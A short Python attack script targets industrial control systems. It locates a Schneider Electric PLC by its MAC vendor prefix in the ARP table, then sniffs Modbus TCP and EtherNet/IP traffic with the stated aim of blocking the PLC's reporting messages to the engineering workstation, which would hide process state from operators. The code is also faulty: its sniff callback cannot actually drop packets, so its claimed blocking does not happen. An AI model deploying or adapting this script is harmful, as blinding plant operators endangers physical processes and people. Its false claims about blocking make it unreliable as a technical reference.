import os
import re
import subprocess
from scapy.all import *
from scapy.layers.inet import IP, TCP

# Function to find the PLC's IP address using ARP scanning
def find_plc_ip():
    # Run ARP scan to find devices on the network
    arp_scan = subprocess.run(["arp", "-a"], capture_output=True, text=True)
    arp_output = arp_scan.stdout

    # Search for the PLC's IP address (assuming a known MAC vendor prefix for Schneider Electric)
    plc_ip = None
    for line in arp_output.splitlines():
        if "00-80-9F" in line or "00-80-9f" in line:  # Schneider Electric MAC vendor prefix
            ip_match = re.search(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", line)
            if ip_match:
                plc_ip = ip_match.group(0)
                break

    if plc_ip:
        print(f"Found PLC IP address: {plc_ip}")
        return plc_ip
    else:
        print("PLC IP address not found.")
        return None

# Function to block reporting messages by dropping packets
def block_reporting_messages(plc_ip):
    def packet_callback(packet):
        # Check if the packet is from the PLC to the engineering workstation
        if IP in packet and TCP in packet:
            if packet[IP].src == plc_ip and packet[TCP].dport in [502, 44818]:  # Modbus TCP or EtherNet/IP ports
                print(f"Blocking reporting message from {plc_ip}")
                return False  # Drop the packet
        return True  # Allow other packets

    # Start sniffing and blocking packets
    print("Starting packet sniffing to block reporting messages...")
    sniff(filter=f"host {plc_ip}", prn=packet_callback, store=0)

# Main script
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        block_reporting_messages(plc_ip)
    else:
        print("Unable to proceed without the PLC's IP address.")